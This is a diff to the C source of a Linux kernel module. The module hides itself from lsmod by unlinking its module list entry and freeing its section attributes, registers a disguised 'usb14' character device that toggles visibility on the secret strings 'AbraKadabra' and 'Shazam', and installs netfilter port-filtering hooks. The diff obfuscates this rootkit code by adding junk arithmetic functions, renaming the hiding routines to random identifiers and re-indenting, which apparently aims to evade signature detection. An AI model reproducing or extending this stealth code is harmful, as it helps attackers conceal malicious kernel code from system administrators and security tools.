@@ -33,9 +33,167 @@ static struct class *fake_class;
 static struct cdev fake_cdev;
 static char message[128];
 static struct nf_hook_ops netfilter_ops;
-int whitelist[]={80,443,53};
+int allowlist[]={80,443,53};
+void fkpjeoyszz7 (void);
+void f6h2545fov0 (void);
+
+/* Junk code generator macros */
+void fx0wyj07r0q (void)
+{
+	int counter=0;
+	int x=0,y=0;
+	x*=1;
+	y++;
+	x+=y;
+	x-=1;
+	y-=1;
+	y+=1;
+	x+=2;
+	x+=1;
+	x*=1;
+	x+=1;
+	x+=y;
+	y+=1;
+	y++;
+	x+=2;
+	x-=1;
+	y-=1;
+	y++;
+	x+=y;
+	y-=1;
+	x+=1;
+	x*=1;
+	x-=1;
+	y+=1;
+	x+=2;
+	x*=1;
+	x+=2;
+	y-=1;
+	y++;
+	x+=y;
+	x-=1;
+	x+=1;
+	y+=1;
+	x+=y;
+	y+=1;
+	y-=1;
+	y++;
+	x+=2;
+	x*=1;
+	x+=1;
+	x-=1;
 
 
+		while(counter!=5)
+		{
+			fkpjeoyszz7();
+			counter++;
+		}
+}
+
+void fkpjeoyszz7 (void)
+{
+	int counter=0;
+	int x=0,y=0;
+	y+=1;
+	x*=1;
+	y++;
+	x+=y;
+	x+=2;
+	y-=1;
+	x-=1;
+	x+=1;
+	x*=1;
+	x-=1;
+	x+=2;
+	y+=1;
+	x+=y;
+	y++;
+	y-=1;
+	x+=1;
+	y-=1;
+	y++;
+	x+=y;
+	x*=1;
+	x+=1;
+	y+=1;
+	x-=1;
+	x+=2;
+	y++;
+	y-=1;
+	x+=y;
+	x*=1;
+	x+=2;
+	x-=1;
+	x+=1;
+	y+=1;
+	x+=y;
+	y+=1;
+	x+=1;
+	x+=2;
+	y-=1;
+	y++;
+	x*=1;
+	x-=1;
+
+
+		while(counter!=4)
+		{
+			f6h2545fov0();
+			counter++;
+		}
+}
+
+
+void f6h2545fov0 (void)
+{
+	int x=0,y=0;
+	y-=1;
+	y++;
+	x*=1;
+	x+=y;
+	x+=2;
+	x+=1;
+	y+=1;
+	x-=1;
+	x+=1;
+	x+=2;
+	x*=1;
+	x+=y;
+	x-=1;
+	y++;
+	y+=1;
+	y-=1;
+	x-=1;
+	x*=1;
+	y++;
+	x+=y;
+	y-=1;
+	x+=1;
+	y+=1;
+	x+=2;
+	x+=1;
+	x+=y;
+	y++;
+	x+=2;
+	x-=1;
+	y+=1;
+	y-=1;
+	x*=1;
+	y-=1;
+	x+=2;
+	x*=1;
+	x+=1;
+	x+=y;
+	x-=1;
+	y+=1;
+	y++;
+
+
+}
+
+
+// block port scans
 unsigned int filter_port_scans(struct sk_buff *skb)
 {
 	struct tcphdr *tcp_header=(struct tcphdr *) skb_transport_header(skb);
@@ -84,14 +242,14 @@ unsigned int filter_port_scans(struct sk_buff *skb)
 
 
 
-void module_hide(void)
+void f0nmavftowx(void)
 {
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 	module_hidden = 1;
 }
 
-static inline void tidy(void)
+static inline void f1pqz1bhm9o(void)
 {
 	kfree(THIS_MODULE->sect_attrs);
 	THIS_MODULE->sect_attrs = NULL;
@@ -122,21 +280,21 @@ ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
 {
 	memset(message,0,127);
 
-	if(copy_from_user(message,buf,127)!=0)
-		return EFAULT;
+		if(copy_from_user(message,buf,127)!=0)
+			return EFAULT;
 
 /* if detect the secret string in device input, show module at lsmod. */
-    	if(strstr(message,"AbraKadabra")!=NULL)
-	{
-		list_add(&THIS_MODULE->list, module_previous);
-		module_hidden = 0;
-     	}
+    		if(strstr(message,"AbraKadabra")!=NULL)
+		{
+			list_add(&THIS_MODULE->list, module_previous);
+			module_hidden = 0;
+     		}
 
 /*	If detect Shazam string in fake device IO turn module invisible to lsmod  */
-    	if(strstr(message,"Shazam")!=NULL)
-		module_hide();
+    		if(strstr(message,"Shazam")!=NULL)
+			f0nmavftowx();
 
-    return count;
+    	return count;
 }
 
 
@@ -206,7 +364,7 @@ LIBERATE_IN_IPV6
 */
 		while(i!=3)
 		{
-			if(dest_port == whitelist[i] || src_port == whitelist[i])
+			if(dest_port == allowlist[i] || src_port == allowlist[i])
 				return NF_ACCEPT; 
 			i++;
 		
@@ -236,7 +394,7 @@ unsigned int test_udp(struct sk_buff *skb)
 
 		while(i!=3)
 		{
-			if(dest_port == whitelist[i] || src_port == whitelist[i])
+			if(dest_port == allowlist[i] || src_port == allowlist[i])
 				return NF_ACCEPT; 
 			i++;
 		
@@ -271,7 +429,7 @@ unsigned int test_tcp_v6(struct sk_buff *skb)
 
 		while(i!=3)
 		{
-			if(dest_port == whitelist[i] || src_port == whitelist[i]) 
+			if(dest_port == allowlist[i] || src_port == allowlist[i]) 
 				return NF_ACCEPT; 
 			i++;
 		}
@@ -319,7 +477,7 @@ unsigned int test_tcp(struct sk_buff *skb)
 
 		while(i!=3)
 		{
-			if(dest_port == whitelist[i] || src_port == whitelist[i]) 
+			if(dest_port == allowlist[i] || src_port == allowlist[i]) 
 				return NF_ACCEPT; 
 			i++;
 		}
@@ -430,28 +588,30 @@ int init_module()
     	struct device *fake_device;
     	int error;
     	dev_t devt = 0;
-
-	module_hide();
-	tidy();
+/*       JUNK CODE gen */
+	fx0wyj07r0q();
+	f0nmavftowx();
+	f1pqz1bhm9o();
 
     /* Get a range of minor numbers (starting with 0) to work with */
     	error = alloc_chrdev_region(&devt, 0, 1, "usb14");
 
-    	if (error < 0) 
-	{
-        	pr_err("Can't get major number\n");
-        	return error;
-    	}
+    		if (error < 0) 
+		{
+        		pr_err("Can't get major number\n");
+        		return error;
+    		}
 
     	major = MAJOR(devt);
 
     /* Create device class, visible in /sys/class */
     	fake_class = class_create(THIS_MODULE, "usb14_class");
 
-    	if (IS_ERR(fake_class)) {
-        	unregister_chrdev_region(MKDEV(major, 0), 1);
-        	return PTR_ERR(fake_class);
-    	}
+    		if (IS_ERR(fake_class)) 
+		{
+        		unregister_chrdev_region(MKDEV(major, 0), 1);
+        		return PTR_ERR(fake_class);
+    		}
 
     /* Initialize the char device and tie a file_operations to it */
     	cdev_init(&fake_cdev, &fake_fops);
@@ -465,12 +625,12 @@ int init_module()
                                 NULL,   /* no additional data */
                                 "usb14");  /* device name */
 
-    	if (IS_ERR(fake_device)) 
-	{
-        	class_destroy(fake_class);
-        	unregister_chrdev_region(devt, 1);
-        	return -1;
-    	}
+    		if (IS_ERR(fake_device)) 
+		{
+        		class_destroy(fake_class);
+        		unregister_chrdev_region(devt, 1);
+        		return -1;
+    		}
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
 	nf_register_net_hook(&init_net, &netfilter_ops);
